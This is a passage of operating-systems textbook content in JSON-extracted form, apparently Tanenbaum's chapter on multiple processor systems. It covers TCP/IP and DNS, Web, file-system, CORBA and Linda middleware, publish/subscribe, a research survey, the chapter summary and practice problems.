IP\r\naddress of a machine and a port number on that machine, to which processes inter\u0002ested in receiving incoming connections listen. Once that has been done, it just\r\npumps bytes into the connection and they are guaranteed to come out the other end\r\nundamaged and in the correct order. The TCP implementation achieves this guar\u0002antee by using sequence numbers, checksums, and retransmissions of incorrectly\r\nreceived packets. All of this is transparent to the sending and receiving processes.\r\nThey just see reliable interprocess communication, just like a UNIX pipe.\r\nTo see how all these protocols interact, consider the simplest case of a very\r\nsmall message that does not need to be fragmented at any lev el. The host is on an\r\nEthernet connected to the Internet. What happens exactly? The user process gen\u0002erates the message and makes a system call to send it on a previously established\r\nTCP connection. The kernel protocol stack adds a TCP header and then an IP\r\nheader to the front. Then it goes to the Ethernet driver, which adds an Ethernet\r\nheader directing the packet to the router on the Ethernet. This router then injects\r\nthe packet into the Internet, as depicted in Fig. 8-31.\r\nInternet\r\nEthernet 1\r\nheader\r\nHeaders\r\nRouter\r\nMessage\r\nHost\r\nEthernet\r\nIP TCP Message\r\nFigure 8-31. Accumulation of packet headers.\r\nTo establish a connection with a remote host (or even to send it a datagram), it\r\nis necessary to know its IP address. Since managing lists of 32-bit IP addresses is\r\ninconvenient for people, a scheme called DNS (Domain Name System) was in\u0002vented as a database that maps ASCII names for hosts onto their IP addresses.\r\nThus it is possible to use the DNS name star.cs.vu.nl instead of the corresponding\r\nIP address 130.37.24.6. DNS names are commonly known because Internet email\n576 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\naddresses are of the form user-name@DNS-host-name. This naming system al\u0002lows the mail program on the sending host to look up the destination host’s IP ad\u0002dress in the DNS database, establish a TCP connection to the mail daemon process\r\nthere, and send the message as a file. The user-name is sent along to identify which\r\nmailbox to put the message in."
          },
          "8.3.3 Document-Based Middleware": {
            "page": 607,
            "content": "8.3.3 Document-Based Middleware\r\nNow that we have some background on networks and protocols, we can start\r\nlooking at different middleware layers that can overlay the basic network to pro\u0002duce a consistent paradigm for applications and users. We will start with a simple\r\nbut well-known example: the World Wide Web. The Web was invented by Tim\r\nBerners-Lee at CERN, the European Nuclear Physics Research Center, in 1989 and\r\nsince then has spread like wildfire all over the world.\r\nThe original paradigm behind the Web was quite simple: every computer can\r\nhold one or more documents, called Web pages. Each Web page contains text,\r\nimages, icons, sounds, movies, and the like, as well as hyperlinks (pointers) to\r\nother Web pages. When a user requests a Web page using a program called a Web\r\nbrowser, the page is displayed on the screen. Clicking on a link causes the current\r\npage to be replaced on the screen by the page pointed to. Although many bells and\r\nwhistles have recently been grafted onto the Web, the underlying paradigm is still\r\nclearly present: the Web is a great big directed graph of documents that can point\r\nto other documents, as shown in Fig. 8-32.\r\nUniversityof NorthSouth\r\nSchool of \r\nHumanities\r\nSchool of \r\nSciences\r\nSchool of Social\r\nSciences\r\nNorthern University\r\nGeography\r\nHistory\r\nLanguages\r\nMain page\r\nGeography Dept\r\nBig countries\r\nSmall countries\r\nRich countries\r\nPoor countries\r\nHumanities\r\nHistory Dept.\r\nAncient times\r\nMedieval times\r\nModern times\r\nFuture times\r\nHumanities\r\nLanguages Dept.\r\nEnglish\r\nFrench\r\nDutch\r\nFrisian\r\nSpanish\r\nHumanities\r\nScience\r\nAstronomy\r\nBiology\r\nChemistry\r\nPhysics\r\nMain page\r\nSocial sciences\r\nAnthropology\r\nPsychology\r\nSociology\r\nMain page\r\nAstronomy Dept.\r\nGalaxies\r\nNebulas\r\nPlanets\r\nQuasars\r\nStars\r\nSciences\r\nBiology Dept.\r\nArachnids\r\nMammals\r\nProtozoa\r\nWorms\r\nSciences\r\nChemistry Dept.\r\nAcids\r\nBases\r\nEsters\r\nProteins\r\nSciences\r\nPhysics Dept.\r\nElectrons\r\nMesons\r\nNeutrons\r\nNeutrinos\r\nProtons\r\nSciences\r\nAnthropology Dept.\r\nAfrican tribes\r\nAustralian tribes\r\nNew Guinean\r\ntribes\r\nSocial sciences\r\nPsychology Dept.\r\nFreud\r\nRats\r\nSocial sciences\r\nSociology Dept\r\nClass struggle\r\nGender struggle\r\nGeneric struggle\r\nSocial sciences\r\nFigure 8-32. The Web is a big directed graph of documents.\r\nEach Web page has a unique address, called a URL (Uniform Resource Loca\u0002tor), of the form protocol://DNS-name/file-name. The protocol is most commonly\r\nhttp (HyperText Transfer Protocol), but ftp and others also exist. Then comes the\r\nDNS name of the host containing the file. Finally, there is a local file name telling\r\nwhich file is needed. Thus a URL uniquely specifies a single file worldwide\nSEC. 8.3 DISTRIBUTED SYSTEMS 577\r\nThe way the whole system hangs together is as follows. The Web is fundamen\u0002tally a client-server system, with the user being the client and the Website being the\r\nserver. When the user provides the browser with a URL, either by typing it in or\r\nclicking on a hyperlink on the current page, the browser takes certain steps to fetch\r\nthe requested Web page. As a simple example, suppose the URL provided is\r\nhttp://www.minix3.org/getting-started/index.html. The browser then takes the fol\u0002lowing steps to get the page.\r\n1. The browser asks DNS for the IP address of www.minix3.org.\r\n2. DNS replies with 66.147.238.215.\r\n3. The browser makes a TCP connection to port 80 on 66.147.238.215.\r\n4. It then sends a request asking for the file getting-started/index.html.\r\n5. The www.minix3.org server sends the file getting-started/index.html.\r\n6. The browser displays all the text in getting-started/index.html.\r\n7. Manwhile, the browser fetches and displays all images on the page.\r\n8. The TCP connection is released.\r\nTo a first approximation, that is the basis of the Web and how it works. Many\r\nother features have since been added to the basic Web, including style sheets, dy\u0002namic Web pages that are generated on the fly, Web pages that contain small pro\u0002grams or scripts that execute on the client machine, and more, but they are outside\r\nthe scope of this discussion."
          },
          "8.3.4 File-System-Based Middleware": {
            "page": 608,
            "content": "8.3.4 File-System-Based Middleware\r\nThe basic idea behind the Web is to make a distributed system look like a giant\r\ncollection of hyperlinked documents. A second approach is to make a distributed\r\nsystem look like a great big file system. In this section we will look at some of the\r\nissues involved in designing a worldwide file system.\r\nUsing a file-system model for a distributed system means that there is a single\r\nglobal file system, with users all over the world able to read and write files for\r\nwhich they hav e authorization. Communication is achieved by having one process\r\nwrite data into a file and having other ones read them back. Many of the standard\r\nfile-system issues arise here, but also some new ones related to distribution.\r\nTransfer Model\r\nThe first issue is the choice between the upload/download model and the\r\nremote-access model. In the former, shown in Fig. 8-33(a), a process accesses a\r\nfile by first copying it from the remote server where it lives. If the file is only to be\n578 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nread, the file is then read locally, for high performance. If the file is to be written,\r\nit is written locally. When the process is done with it, the updated file is put back\r\non the server. With the remote-access model, the file stays on the server and the cli\u0002ent sends commands there to get work done there, as shown in Fig. 8-33(b).\r\n2. Accesses are\r\n done on the\r\n client\r\n3. When client is\r\n done, file is\r\n returned to server\r\nNew file\r\nClient Server Old file Client Server\r\n1. Client fetches file\r\nFile stays\r\non server\r\nReply\r\nRequest\r\n(a) (b)\r\nFigure 8-33. (a) The upload/download model. (b) The remote-access model.\r\nThe advantages of the upload/download model are its simplicity, and the fact\r\nthat transferring entire files at once is more efficient than transferring them in small\r\npieces. The disadvantages are that there must be enough storage for the entire file\r\nlocally, moving the entire file is wasteful if only parts of it are needed, and consis\u0002tency problems arise if there are multiple concurrent users.\r\nThe Directory Hierarchy\r\nFiles are only part of the story. The other part is the directory system. All dis\u0002tributed file systems support directories containing multiple files. The next design\r\nissue is whether all clients have the same view of the directory hierarchy. As an\r\nexample of what we mean, consider Fig. 8-34. In Fig. 8-34(a) we show two file\r\nservers, each holding three directories and some files. In Fig. 8-34(b) we have a\r\nsystem in which all clients (and other machines) have the same view of the distrib\u0002uted file system. If the path /D/E/x is valid on one machine, it is valid on all of\r\nthem.\r\nIn contrast, in Fig. 8-34(c), different machines can have different views of the\r\nfile system. To repeat the preceding example, the path /D/E/x might well be valid\r\non client 1 but not on client 2. In systems that manage multiple file servers by re\u0002mote mounting, Fig. 8-34(c) is the norm. It is flexible and straightforward to im\u0002plement, but it has the disadvantage of not making the entire system behave like a\r\nsingle old-fashioned timesharing system. In a timesharing system, the file system\r\nlooks the same to any process, as in the model of Fig. 8-34(b). This property\r\nmakes a system easier to program and understand.\nSEC. 8.3 DISTRIBUTED SYSTEMS 579\r\nA Root\r\nB C A D\r\nB C\r\nFile server 1 Client 1\r\nE F\r\nRoot\r\nA D\r\nB C\r\nClient 1\r\nE F\r\nD Root\r\nE F A D\r\nB C\r\nFile server 2 Client 2\r\nE F\r\nRoot\r\nA\r\nD\r\nB C\r\nClient 2\r\nE\r\n(a)\r\n(b)\r\n(c)\r\nF\r\nFigure 8-34. (a) Two file servers. The squares are directories and the circles are\r\nfiles. (b) A system in which all clients have the same view of the file system.\r\n(c) A system in which different clients have different views of the file system.\r\nA closely related question is whether or not there is a global root directory,\r\nwhich all machines recognize as the root. One way to have a global root directory\r\nis to have the root contain one entry for each server and nothing else. Under these\r\ncircumstances, paths take the form /server/path, which has its own disadvantages,\r\nbut at least is the same everywhere in the system.\r\nNaming Transparency\r\nThe principal problem with this form of naming is that it is not fully transpar\u0002ent. Two forms of transparency are relevant in this context and are worth distin\u0002guishing. The first one, location transparency, means that the path name gives no\r\nhint as to where the file is located. A path like /server1/dir1/dir2/x tells everyone\n580 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nthat x is located on server 1, but it does not tell where that server is located. The\r\nserver is free to move anywhere it wants to in the network without the path name\r\nhaving to be changed. Thus this system has location transparency.\r\nHowever, suppose that file x is extremely large and space is tight on server 1.\r\nFurthermore, suppose that there is plenty of room on server 2. The system might\r\nwell like to move x to server 2 automatically. Unfortunately, when the first compo\u0002nent of all path names is the server, the system cannot move the file to the other\r\nserver automatically, even if dir1 and dir2 exist on both servers. The problem is\r\nthat moving the file automatically changes its path name from /server1/dir1/dir2/x\r\nto /server2/dir1/dir2/x. Programs that have the former string built into them will\r\ncease to work if the path changes. A system in which files can be moved without\r\ntheir names changing is said to have location independence. A distributed system\r\nthat embeds machine or server names in path names clearly is not location inde\u0002pendent. One based on remote mounting is not, either, since it is not possible to\r\nmove a file from one file group (the unit of mounting) to another and still be able\r\nto use the old path name. Location independence is not easy to achieve, but it is a\r\ndesirable property to have in a distributed system.\r\nTo summarize what we said earlier, there are three common approaches to file\r\nand directory naming in a distributed system:\r\n1. Machine + path naming, such as /machine/path or machine:path.\r\n2. Mounting remote file systems onto the local file hierarchy.\r\n3. A single name space that looks the same on all machines.\r\nThe first two are easy to implement, especially as a way to connect existing sys\u0002tems that were not designed for distributed use. The latter is difficult and requires\r\ncareful design, but makes life easier for programmers and users.\r\nSemantics of File Sharing\r\nWhen two or more users share the same file, it is necessary to define the\r\nsemantics of reading and writing precisely to avoid problems. In single-processor\r\nsystems the semantics normally state that when a read system call follows a wr ite\r\nsystem call, the read returns the value just written, as shown in Fig. 8-35(a). Simi\u0002larly, when two wr ites happen in quick succession, followed by a read, the value\r\nread is the value stored by the last write. In effect, the system enforces an ordering\r\non all system calls, and all processors see the same ordering. We will refer to this\r\nmodel as sequential consistency.\r\nIn a distributed system, sequential consistency can be achieved easily as long\r\nas there is only one file server and clients do not cache files. All reads and wr ites\r\ngo directly to the file server, which processes them strictly sequentially.\r\nIn practice, however, the performance of a distributed system in which all file\r\nrequests must go to a single server is frequently poor. This problem is often solved\nSEC. 8.3 DISTRIBUTED SYSTEMS 581\r\na b\r\na b c\r\nA\r\nB\r\nSingle processor\r\nOriginal\r\nfile\r\n1. Write \"c\"\r\n2. Read gets \"abc\"\r\n(a)\r\n(b)\r\na b\r\na b\r\na b c\r\nA\r\nClient 1\r\n1. Read \"ab\" 2. Write \"c\"\r\nFile server \r\n3. Read gets \"ab\"\r\nClient 2\r\nB a b\r\nFigure 8-35. (a) Sequential consistency. (b) In a distributed system with cach\u0002ing, reading a file may return an obsolete value.\r\nby allowing clients to maintain local copies of heavily used files in their private\r\ncaches. However, if client 1 modifies a cached file locally and shortly thereafter\r\nclient 2 reads the file from the server, the second client will get an obsolete file, as\r\nillustrated in Fig. 8-35(b).\r\nOne way out of this difficulty is to propagate all changes to cached files back\r\nto the server immediately. Although conceptually simple, this approach is inef\u0002ficient. An alternative solution is to relax the semantics of file sharing. Instead of\r\nrequiring a read to see the effects of all previous wr ites, one can have a new rule\r\nthat says: ‘‘Changes to an open file are initially visible only to the process that\r\nmade them. Only when the file is closed are the changes visible to other proc\u0002esses.’’ The adoption of such a rule does not change what happens in Fig. 8-35(b),\r\nbut it does redefine the actual behavior (B getting the original value of the file) as\r\nbeing the correct one. When client 1 closes the file, it sends a copy back to the ser\u0002ver, so that subsequent reads get the new value, as required. Effectively, this is the\n582 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nupload/download model shown in Fig. 8-33. This semantic rule is widely imple\u0002mented and is known as session semantics.\r\nUsing session semantics raises the question of what happens if two or more cli\u0002ents are simultaneously caching and modifying the same file. One solution is to say\r\nthat as each file is closed in turn, its value is sent back to the server, so the final re\u0002sult depends on who closes last. A less pleasant, but slightly easier to implement,\r\nalternative is to say that the final result is one of the candidates, but leave the\r\nchoice of which one unspecified.\r\nAn alternative approach to session semantics is to use the upload/download\r\nmodel, but to automatically lock a file that has been downloaded. Attempts by\r\nother clients to download the file will be held up until the first client has returned\r\nit. If there is a heavy demand for a file, the server could send messages to the cli\u0002ent holding the file, asking it to hurry up, but that may or may not help. All in all,\r\ngetting the semantics of shared files right is a tricky business with no elegant and\r\nefficient solutions."
          },
          "8.3.5 Object-Based Middleware": {
            "page": 613,
            "content": "8.3.5 Object-Based Middleware\r\nNow let us take a look at a third paradigm. Instead of saying that everything is\r\na document or everything is a file, we say that everything is an object. An object\r\nis a collection of variables that are bundled together with a set of access proce\u0002dures, called methods. Processes are not permitted to access the variables directly.\r\nInstead, they are required to invoke the methods.\r\nSome programming languages, such as C++ and Java, are object oriented, but\r\nthese are language-level objects rather than run-time objects. One well-known sys\u0002tem based on run-time objects is CORBA (Common Object Request Broker\r\nArchitecture) (Vinoski, 1997). CORBA is a client-server system, in which client\r\nprocesses on client machines can invoke operations on objects located on (possibly\r\nremote) server machines. CORBA was designed for a heterogeneous system run\u0002ning a variety of hardware platforms and operating systems and programmed in a\r\nvariety of languages. To make it possible for a client on one platform to invoke a\r\nserver on a different platform, ORBs (Object Request Brokers) are interposed be\u0002tween client and server to allow them to match up. The ORBs play an important\r\nrole in CORBA, even providing the system with its name.\r\nEach CORBA object is defined by an interface definition in a language called\r\nIDL (Interface Definition Language), which tells what methods the object\r\nexports and what parameter types each one expects. The IDL specification can be\r\ncompiled into a client stub procedure and stored in a library. If a client process\r\nknows in advance that it will need to access a certain object, it is linked with the\r\nobject’s client stub code. The IDL specification can also be compiled into a skele\u0002ton procedure that is used on the server side. If it is not known in advance which\r\nCORBA objects a process needs to use, dynamic invocation is also possible, but\r\nhow that works is beyond the scope of our treatment.\nSEC. 8.3 DISTRIBUTED SYSTEMS 583\r\nWhen a CORBA object is created, a reference to it is also created and returned\r\nto the creating process. This reference is how the process identifies the object for\r\nsubsequent invocations of its methods. The reference can be passed to other proc\u0002esses or stored in an object directory.\r\nTo inv oke a method on an object, a client process must first acquire a reference\r\nto the object. The reference can come either directly from the creating process or,\r\nmore likely, by looking it up by name or by function in some kind of directory.\r\nOnce the object reference is available, the client process marshals the parameters to\r\nthe method calls into a convenient structure and then contacts the client ORB. In\r\nturn, the client ORB sends a message to the server ORB, which actually invokes\r\nthe method on the object. The whole mechanism is similar to RPC.\r\nThe function of the ORBs is to hide all the low-level distribution and commu\u0002nication details from the client and server code. In particular, the ORBs hide from\r\nthe client the location of the server, whether the server is a binary program or a\r\nscript, what hardware and operating system the server runs on, whether the object\r\nis currently active, and how the two ORBs communicate (e.g., TCP/IP, RPC, shar\u0002ed memory, etc.).\r\nIn the first version of CORBA, the protocol between the client ORB and the\r\nserver ORB was not specified. As a result, every ORB vendor used a different pro\u0002tocol and no two of them could talk to each other. In version 2.0, the protocol was\r\nspecified. For communication over the Internet, the protocol is called IIOP (Inter\u0002net InterOrb Protocol).\r\nTo make it possible to use objects that were not written for CORBA with\r\nCORBA systems, every object can be equipped with an object adapter. This is a\r\nwrapper that handles chores such as registering the object, generating object refer\u0002ences, and activating the object if it is invoked when it is not active. The arrange\u0002ment of all these CORBA parts is shown in Fig. 8-36.\r\nClient Client stub\r\nOperating system\r\nClient ORB\r\nClient\r\ncode\r\nObject\r\nadapter\r\nOperating system\r\nServer\r\ncode\r\nSkeleton Server\r\nIIOP protocol\r\nNetwork\r\nServer ORB\r\nFigure 8-36. The main elements of a distributed system based on CORBA. The\r\nCORBA parts are shown in gray.\n584 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nA serious problem with CORBA is that every object is located on only one ser\u0002ver, which means the performance will be terrible for objects that are heavily used\r\non client machines around the world. In practice, CORBA functions acceptably\r\nonly in small-scale systems, such as to connect processes on one computer, one\r\nLAN, or within a single company."
          },
          "8.3.6 Coordination-Based Middleware": {
            "page": 615,
            "content": "8.3.6 Coordination-Based Middleware\r\nOur last paradigm for a distributed system is called coordination-based mid\u0002dleware. We will discuss it by looking at the Linda system, an academic research\r\nproject that started the whole field.\r\nLinda is a novel system for communication and synchronization developed at\r\nYale University by David Gelernter and his student Nick Carriero (Carriero and\r\nGelernter, 1986; Carriero and Gelernter, 1989; and Gelernter, 1985). In Linda, in\u0002dependent processes communicate via an abstract tuple space. The tuple space is\r\nglobal to the entire system, and processes on any machine can insert tuples into the\r\ntuple space or remove tuples from the tuple space without regard to how or where\r\nthey are stored. To the user, the tuple space looks like a big, global shared memo\u0002ry, as we hav e seen in various forms before, as in Fig. 8-21(c).\r\nA tuple is like a structure in C or Java. It consists of one or more fields, each\r\nof which is a value of some type supported by the base language (Linda is imple\u0002mented by adding a library to an existing language, such as C). For C-Linda, field\r\ntypes include integers, long integers, and floating-point numbers, as well as com\u0002posite types such as arrays (including strings) and structures (but not other tuples).\r\nUnlike objects, tuples are pure data; they do not have any associated methods. Fig\u0002ure 8-37 shows three tuples as examples.\r\n(\"abc\", 2, 5)\r\n(\"matr ix-1\", 1, 6, 3.14)\r\n(\"family\", \"is-sister\", \"Stephany\", \"Roberta\")\r\nFigure 8-37. Three Linda tuples.\r\nFour operations are provided on tuples. The first one, out, puts a tuple into the\r\ntuple space. For example,\r\nout(\"abc\", 2, 5);\r\nputs the tuple (\"abc\", 2, 5) into the tuple space. The fields of out are normally con\u0002stants, variables, or expressions, as in\r\nout(\"matr ix−1\", i, j, 3.14);\r\nwhich outputs a tuple with four fields, the second and third of which are deter\u0002mined by the current values of the variables i and j.\nSEC. 8.3 DISTRIBUTED SYSTEMS 585\r\nTuples are retrieved from the tuple space by the in primitive. They are ad\u0002dressed by content rather than by name or address. The fields of in can be expres\u0002sions or formal parameters. Consider, for example,\r\nin(\"abc\", 2, ?i);\r\nThis operation ‘‘searches’’ the tuple space for a tuple consisting of the string\r\n‘‘abc’’, the integer 2, and a third field containing any integer (assuming that i is an\r\ninteger). If found, the tuple is removed from the tuple space and the variable i is\r\nassigned the value of the third field. The matching and removal are atomic, so if\r\ntwo processes execute the same in operation simultaneously, only one of them will\r\nsucceed, unless two or more matching tuples are present. The tuple space may even\r\ncontain multiple copies of the same tuple.\r\nThe matching algorithm used by in is straightforward. The fields of the in\r\nprimitive, called the template, are (conceptually) compared to the corresponding\r\nfields of every tuple in the tuple space. A match occurs if the following three con\u0002ditions are all met:\r\n1. The template and the tuple have the same number of fields.\r\n2. The types of the corresponding fields are equal.\r\n3. Each constant or variable in the template matches its tuple field.\r\nFormal parameters, indicated by a question mark followed by a variable name or\r\ntype, do not participate in the matching (except for type checking), although those\r\ncontaining a variable name are assigned after a successful match.\r\nIf no matching tuple is present, the calling process is suspended until another\r\nprocess inserts the needed tuple, at which time the called is automatically revived\r\nand given the new tuple. The fact that processes block and unblock automatically\r\nmeans that if one process is about to output a tuple and another is about to input it,\r\nit does not matter which goes first. The only difference is that if the in is done be\u0002fore the out, there will be a slight delay until the tuple is available for removal.\r\nThe fact that processes block when a needed tuple is not present can be put to\r\nmany uses. For example, it can be used to implement semaphores. To create or do\r\nan up on semaphore S, a process can execute\r\nout(\"semaphore S\");\r\nTo do a down, it does\r\nin(\"semaphore S\");\r\nThe state of semaphore S is determined by the number of (‘‘semaphore S’’) tuples\r\nin the tuple space. If none exist, any attempt to get one will block until some other\r\nprocess supplies one.\r\nIn addition to out and in, Linda also has a primitive operation read, which is\r\nthe same as in except that it does not remove the tuple from the tuple space. There\n586 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nis also a primitive eval, which causes its parameters to be evaluated in parallel and\r\nthe resulting tuple to be put in the tuple space. This mechanism can be used to per\u0002form an arbitrary computation. This is how parallel processes are created in Linda.\r\nPublish/Subscribe\r\nOur next example of a coordination-based model was inspired by Linda and is\r\ncalled publish/subscribe (Oki et al., 1993). It consists of a number of processes\r\nconnected by a broadcast network. Each process can be a producer of information,\r\na consumer of information, or both.\r\nWhen an information producer has a new piece of information (e.g., a new\r\nstock price), it broadcasts the information as a tuple on the network. This action is\r\ncalled publishing. Each tuple contains a hierarchical subject line containing mul\u0002tiple fields separated by periods. Processes that are interested in certain infor\u0002mation can subscribe to certain subjects, including the use of wildcards in the sub\u0002ject line. Subscription is done by telling a tuple daemon process on the same ma\u0002chine that monitors published tuples what subjects to look for.\r\nPublish/subscribe is implemented as illustrated in Fig. 8-38. When a process\r\nhas a tuple to publish, it broadcasts it out onto the local LAN. The tuple daemon\r\non each machine copies all broadcasted tuples into its RAM. It then inspects the\r\nsubject line to see which processes are interested in it, forwarding a copy to each\r\none that is. Tuples can also be broadcast over a wide area network or the Internet\r\nby having one machine on each LAN act as an information router, collecting all\r\npublished tuples and then forwarding them to other LANs for rebroadcasting. This\r\nforwarding can also be done intelligently, forwarding a tuple to a remote LAN only\r\nif that remote LAN has at least one subscriber who wants the tuple. Doing this re\u0002quires having the information routers exchange information about subscribers.\r\nInformation router\r\nConsumer Daemon\r\nLAN\r\nProducer\r\nWAN\r\nFigure 8-38. The publish/subscribe architecture.\r\nVarious kinds of semantics can be implemented, including reliable delivery\r\nand guaranteed delivery, even in the presence of crashes. In the latter case, it is\nSEC. 8.3 DISTRIBUTED SYSTEMS 587\r\nnecessary to store old tuples in case they are needed later. One way to store them is\r\nto hook up a database system to the system and have it subscribe to all tuples. This\r\ncan be done by wrapping the database system in an adapter, to allow an existing\r\ndatabase to work with the publish/subscribe model. As tuples come by, the adapter\r\ncaptures all of them and puts them in the database.\r\nThe publish/subscribe model fully decouples producers from consumers, as\r\ndoes Linda. However, sometimes it is useful to know who else is out there. This\r\ninformation can be acquired by publishing a tuple that basically asks: ‘‘Who out\r\nthere is interested in x?’’ Responses come back in the form of tuples that say: ‘‘I\r\nam interested in x.’’"
          }
        }
      },
      "8.4 RESEARCH ON MULTIPLE PROCESSOR SYSTEMS": {
        "page": 618,
        "content": "8.4 RESEARCH ON MULTIPLE PROCESSOR SYSTEMS\r\nFew topics in operating systems research are as popular as multicores, multi\u0002processors, and distributed systems. Besides the direct problems of mapping oper\u0002ating system functionality on a system consisting of multiple processing cores,\r\nthere are many open research problems related to synchronization and consistency,\r\nand the way to make such systems faster and more reliable.\r\nSome research efforts have aimed at designing new operating systems from\r\nscratch specifically for multicore hardware. For instance, the Corey operating sys\u0002tem addresses the performance problems caused by data structure sharing across\r\nmultiple cores (Boyd-Wickizer et al., 2008). By carefully arranging kernel data\r\nstructures in such a way that no sharing is needed, many of the performance bottle\u0002necks disappear. Similarly, Barrelfish (Baumann et al., 2009) is a new operating\r\nsystem motivated by the rapid growth in the number of cores on the one hand, and\r\nthe growth in hardware diversity on the other. It models the operating system after\r\ndistributed systems with message passing instead of shared memory as the commu\u0002nication model. Other operating systems aim at scalability and performance. Fos\r\n(Wentzlaff et al., 2010) is an operating system that was designed to scale from the\r\nsmall (multicore CPUs) to the very large (clouds). Meanwhile, NewtOS (Hruby et\r\nal., 2012; and Hruby et al., 2013) is a new multiserver operating system that aims\r\nfor both dependability (with a modular design and many isolated components\r\nbased originally on Minix 3) and performance (which has traditionally been the\r\nweak point of such modular multiserver systems).\r\nMulticore is not just for new designs. In Boyd-Wickizer et al. (2010), the re\u0002searchers study and remove the bottlenecks they encounter when scaling Linux to a\r\n48-core machine. They show that such systems, if designed carefully, can be made\r\nto scale quite well. Clements et al. (2013) investigate the fundamental principle\r\nthat govern whether or not an API can be implemented in a scalable fashion. They\r\nshow that whenever interface operations commute, a scalable implementation of\r\nthat interface exists. With this knowledge, operating system designers can build\r\nmore scalable operating systems.\n588 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nMuch systems research in recent years has also gone into making large appli\u0002cations scale to multicore and multiprocessor environments. One example is the\r\nscalable database engine described by Salomie et al. (2011). Again, the solution is\r\nto achieve scalability by replicating the database rather than trying to hide the par\u0002allel nature of the hardware.\r\nDebugging parallel applications is very hard, and race conditions are hard to\r\nreproduce. Viennot et al. (2013) show how replay can help to debug software on\r\nmulticore systems. Lachaize et al. provide a memory profiler for multicore sys\u0002tems, and Kasikci et al. (2012) present work not just on detecting race conditions\r\nin software, but even on how to tell good races from bad ones.\r\nFinally, there is a lot of work on reducing power consumption in multiproces\u0002sors. Chen et al. (2013) propose the use of power containers to provide fine\u0002grained power and energy management."
      },
      "8.5 SUMMARY": {
        "page": 619,
        "content": "8.5 SUMMARY\r\nComputer systems can be made faster and more reliable by using multiple\r\nCPUs. Four organizations for multi-CPU systems are multiprocessors, multicom\u0002puters, virtual machines, and distributed systems. Each of these has its own proper\u0002ties and issues.\r\nA multiprocessor consists of two or more CPUs that share a common RAM.\r\nOften these CPUs themselves consists of multiple cores. The cores and CPUs can\r\nbe interconnected by a bus, a crossbar switch, or a multistage switching network.\r\nVarious operating system configurations are possible, including giving each CPU\r\nits own operating system, having one master operating system with the rest being\r\nslaves, or having a symmetric multiprocessor, in which there is one copy of the op\u0002erating system that any CPU can run. In the latter case, locks are needed to provide\r\nsynchronization. When a lock is not available, a CPU can spin or do a context\r\nswitch. Various scheduling algorithms are possible, including time sharing, space\r\nsharing, and gang scheduling.\r\nMulticomputers also have two or more CPUs, but these CPUs each have their\r\nown private memory. They do not share any common RAM, so all communication\r\nuses message passing. In some cases, the network interface board has its own\r\nCPU, in which case the communication between the main CPU and the inter\u0002face-board CPU has to be carefully organized to avoid race conditions. User-level\r\ncommunication on multicomputers often uses remote procedure calls, but distrib\u0002uted shared memory can also be used. Load balancing of processes is an issue here,\r\nand the various algorithms used for it include sender-initiated algorithms, re\u0002ceiver-initiated algorithms, and bidding algorithms.\r\nDistributed systems are loosely coupled systems each of whose nodes is a\r\ncomplete computer with a complete set of peripherals and its own operating sys\u0002tem. Often these systems are spread over a large geographical area. Middleware is\nSEC. 8.5 SUMMARY 589\r\noften put on top of the operating system to provide a uniform layer for applications\r\nto interact with. The various kinds include document-based, file-based, ob\u0002ject-based, and coordination-based middleware. Some examples are the World\r\nWide Web, CORBA, and Linda.\r\nPROBLEMS\r\n1. Can the USENET newsgroup system or the SETI@home project be considered distrib\u0002uted systems? (SETI@home uses several million idle personal computers to analyze\r\nradio telescope data to search for extraterrestrial intelligence.) If so, how do they relate\r\nto the categories described in Fig. 8-1?\r\n2. What happens if three CPUs in a multiprocessor attempt to access exactly the same\r\nword of memory at exactly the same instant?\r\n3. If a CPU issues one memory request every instruction and the computer runs at 200\r\nMIPS, about how many CPUs will it take to saturate a 400-MHz bus? Assume that a\r\nmemory reference requires one bus cycle. Now repeat this problem for a system in\r\nwhich caching is used and the caches have a 90% hit rate. Finally, what cache hit rate\r\nwould be needed to allow 32 CPUs to share the bus without overloading it?\r\n4. Suppose that the wire between switch 2A and switch 3B in the omega network of\r\nFig. 8-5 breaks. Who is cut off from whom?\r\n5. How is signal handling done in the model of Fig. 8-7?\r\n6. When a system call is made in the model of Fig. 8-8, a problem has to be solved im\u0002mediately after the trap that does not occur in the model of Fig. 8-7. What is the nature\r\nof this problem and how might it be solved?\r\n7. Rewrite the enter region code of Fig. 2-22 using the pure read to reduce thrashing\r\ninduced by the TSL instruction.\r\n8. Multicore CPUs are beginning to appear in conventional desktop machines and laptop\r\ncomputers. Desktops with tens or hundreds of cores are not far off. One possible way\r\nto harness this power is to parallelize standard desktop applications such as the word\r\nprocessor or the web browser. Another possible way to harness the power is to paral\u0002lelize the services offered by the operating system -- e.g., TCP processing -- and com\u0002monly-used library services -- e.g., secure http library functions). Which approach ap\u0002pears the most promising? Why?\r\n9. Are critical regions on code sections really necessary in an SMP operating system to\r\navoid race conditions or will mutexes on data structures do the job as well?\r\n10. When the TSL instruction is used for multiprocessor synchronization, the cache block\r\ncontaining the mutex will get shuttled back and forth between the CPU holding the\r\nlock and the CPU requesting it if both of them keep touching the block. To reduce bus\r\ntraffic, the requesting CPU executes one TSL ev ery 50 bus cycles, but the CPU holding\r\nthe lock always touches the cache block between TSL instructions. If a cache block\n590 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nconsists of 16 32-bit words, each of which requires one bus cycle to transfer, and the\r\nbus runs at 400 MHz, what fraction of the bus bandwidth is eaten up by moving the\r\ncache block back and forth?\r\n11. In the text, it was suggested that a binary exponential backoff algorithm be used be\u0002tween uses of TSL to poll a lock. It was also suggested to have a maximum delay be\u0002tween polls. Would the algorithm work correctly if there were no maximum delay?\r\n12. Suppose that the TSL instruction was not available for synchronizing a multiprocessor.\r\nInstead, another instruction, SWP, was provided that atomically swapped the contents\r\nof a register with a word in memory. Could that be used to provide multiprocessor syn\u0002chronization? If so, how could it be used? If not, why does it not work?\r\n13. In this problem you are to compute how much of a bus load a spin lock puts on the bus.\r\nImagine that each instruction executed by a CPU takes 5 nsec. After an instruction has\r\ncompleted, any bus cycles needed, for example, for TSL are carried out. Each bus cycle\r\ntakes an additional 10 nsec above and beyond the instruction execution time. If a proc\u0002ess is attempting to enter a critical region using a TSL loop, what fraction of the bus\r\nbandwidth does it consume? 